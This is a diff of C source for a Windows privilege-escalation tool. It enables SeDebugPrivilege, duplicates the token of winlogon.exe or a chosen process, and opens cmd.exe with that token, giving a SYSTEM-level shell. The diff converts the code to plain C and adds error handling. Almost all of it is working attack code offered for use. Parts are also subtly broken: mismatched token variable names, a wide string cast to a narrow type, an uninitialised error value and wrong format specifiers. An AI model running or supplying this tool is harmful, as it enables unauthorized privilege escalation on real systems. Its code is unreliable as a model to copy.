@@ -1,10 +1,8 @@
-#include <stdio.h>
-#include <windows.h>
-#include <iostream>
-#include <tlhelp32.h>
+#include<stdio.h>
+#include<windows.h>
+#include<tlhelp32.h>
 
 #include "nt-system.h"
-
 
 enum LogonFlags { WithProfile = 1, NetCredentialsOnly }; 
 
@@ -47,18 +45,15 @@ struct _LUID {
 	 TOKEN_ADJUST_SESSIONID)
 #endif
 
-using namespace std; 
+int main(int argc, char *argv[]){
 
-
-
-int wmain(int argc, wchar_t** argv)
-{
 	BOOL is_winlogon = FALSE; 
 
 	if (argc != 2) {
 		puts("\n[+]using by default winlogon.exe\n");
 		is_winlogon = TRUE;
 	}
+
 	/* Enabling SeDebugpriv in case its not enabled */
 
 	const WCHAR*  Privilege = L"SeDebugPrivilege";
@@ -70,24 +65,26 @@ int wmain(int argc, wchar_t** argv)
 	LUID_AND_ATTRIBUTES lu_attr ;
 	DWORD trash; 
 	
-	HANDLE hCurrentproc = OpenProcess(PROCESS_QUERY_INFORMATION, false, GetCurrentProcessId());
-	if (hCurrentproc == INVALID_HANDLE_VALUE)
-	{
+	HANDLE hCurrentproc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
+	if(hCurrentproc == INVALID_HANDLE_VALUE){
 		puts("[-] Couldn't open handle to current process\n");
-		exit(1); 
+		exit(EXIT_FAILURE); 
 	}
 
-	if (!OpenProcessToken(hCurrentproc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,hToken))
-	{
-		
-		puts("[-] error retrieving token for the current process\n"); 
-		exit(1); 
+	if(!OpenProcessToken(hCurrentproc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,hToken)){
+	 	fprintf(stderr, "[-] error retrieving token for the current process :\n");
+		perrno((char *)"OpenProcessToken");
+		CloseHandle(hCurrentproc);
+		exit(EXIT_FAILURE); 
 	}
-	if (! LookupPrivilegeValue(NULL, Privilege, &luid)) 
-	{
-		puts("[-]couldnt get a handle to privilege struct\n"); 
-		exit(1); 
+
+	if(!LookupPrivilegeValue(NULL, (LPCSTR)Privilege, &luid)){
+		fprintf(stderr, "[-] couldnt get a handle to privilege struct\n");
+		perror("LookupPrivilegeValue");
+		CloseHandle(hCurrentproc);
+		exit(EXIT_FAILURE); 
 	}
+
 	/* Saving old state */
 	TOKEN_PRIVILEGES old_state = TOKEN_PRIVILEGES(); 
 
@@ -96,7 +93,7 @@ int wmain(int argc, wchar_t** argv)
 	TP.PrivilegeCount = 1;
 	TP.Privileges[0] = lu_attr; 
 
-	if (!AdjustTokenPrivileges(token, false, &TP, (unsigned __int32)sizeof(TP), &old_state, &trash)) {
+	if (!AdjustTokenPrivileges(token, FALSE, &TP, (unsigned __int32)sizeof(TP), &old_state, &trash)) {
 		printf("%d", GetLastError());
 		puts("[-] can't adjust token for debug priveleges "); 
 		exit(1); 
@@ -105,7 +102,13 @@ int wmain(int argc, wchar_t** argv)
 
 	/* duplicating the token */
 
-	HANDLE target = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, is_winlogon ? getPID(L"winlogon.exe") : getPID(argv[1])); 
+	HANDLE target = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, is_winlogon ? get_proc_id((char *)"winlogon.exe") : get_proc_id(argv[1])); 
+	if(!target){
+		fprintf(stderr, "Can't find %d PID", is_winlogon ? "winlogon.exe" : argv[1]);
+		CloseHandle(hCurrentproc);
+		return -1;
+	}
+
 	SECURITY_IMPERSONATION_LEVEL seImpLv = SecurityImpersonation; 
 	TOKEN_TYPE tkentype = TokenPrimary; 
 	SECURITY_ATTRIBUTES sec_att = SECURITY_ATTRIBUTES(); 
@@ -114,6 +117,7 @@ int wmain(int argc, wchar_t** argv)
 	if (target == INVALID_HANDLE_VALUE)
 	{
 		puts("[-] Couldn't open handle to target process\n");
+		CloseHandle(hCurrentproc);
 		exit(1);
 	}
 
@@ -121,6 +125,7 @@ int wmain(int argc, wchar_t** argv)
 	{
 
 		puts("[-] error retrieving token for the target process\n");
+		CloseHandle(hCurrentproc);
 		exit(1);
 	}
 	puts("[+] system process token retrieved\n"); 
@@ -128,6 +133,7 @@ int wmain(int argc, wchar_t** argv)
 	{
 		printf("%d", GetLastError()); 
 		puts("[+] unable to duplicate token \n"); 
+		CloseHandle(hCurrentproc);
 		exit(1); 
 	}
 	puts("[+] Token duplicated successfully\n"); 
@@ -136,39 +142,52 @@ int wmain(int argc, wchar_t** argv)
 	STARTUPINFO SI = STARTUPINFO(); 
 	PROCESS_INFORMATION PI; 
 
-	if (!CreateProcessWithTokenW(newtoken, NetCredentialsOnly, L"C:\\Windows\\System32\\cmd.exe", NULL, NewConsole, 0, NULL, &SI, &PI)) 
+	if (!CreateProcessWithTokenW(newtoken, NetCredentialsOnly, L"C:\\Windows\\System32\\cmd.exe", NULL, NewConsole, 0, NULL, (LPSTARTUPINFOW)&SI, &PI)) 
 	{
 
 		puts("[+] unable to create process \n");
+		CloseHandle(hCurrentproc);
 		exit(1);
 	}
 	puts("[+] process Created success !"); 
+	return 0;
 }
 
+DWORD get_proc_id(char *name){
+	DWORD pid = 0;
+	PROCESSENTRY32 pe = {0};
 
-DWORD getPID(std::wstring name) // Get pid by name of process 
-{
-	DWORD PID = -1;
-
-	PROCESSENTRY32 entry;
-	entry.dwSize = sizeof(PROCESSENTRY32);
-
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-
-	if (Process32First(snapshot, &entry) == TRUE)
-	{
-		while (Process32Next(snapshot, &entry) == TRUE)
-		{
-			std::wstring binaryPath = entry.szExeFile;
-			if (binaryPath.find(name) != std::wstring::npos)
-			{
-				PID = entry.th32ProcessID;
-
-				break;
-			}
-		}
+	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if(h == INVALID_HANDLE_VALUE){
+		fprintf(stderr, "CreateToolhelp32Snapshot failed with %lld\n", GetLastError());
+		return pid;
 	}
 
-	CloseHandle(snapshot);
-	return PID;
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	if(Process32First(h, &pe)){
+		do{
+			if(!strcmp(pe.szExeFile, name)){
+				pid = pe.th32ProcessID;
+				break;
+			}
+		}while(Process32Next(h, &pe));
+	}
+	else
+		perrno((char *)"Process32First");
+
+	CloseHandle(h);
+
+	return pid;
 }
+
+void perrno(const char *func){
+ 	TCHAR err_msg[256] = {0};
+ 	DWORD errn;
+ 
+ 	FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+          NULL, errn,
+          MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+          err_msg, 256, NULL );
+ 
+ 	 fprintf(stderr, "\n WARNING: %s failed with error %d (%s)\n", func, errno, err_msg );
+ }
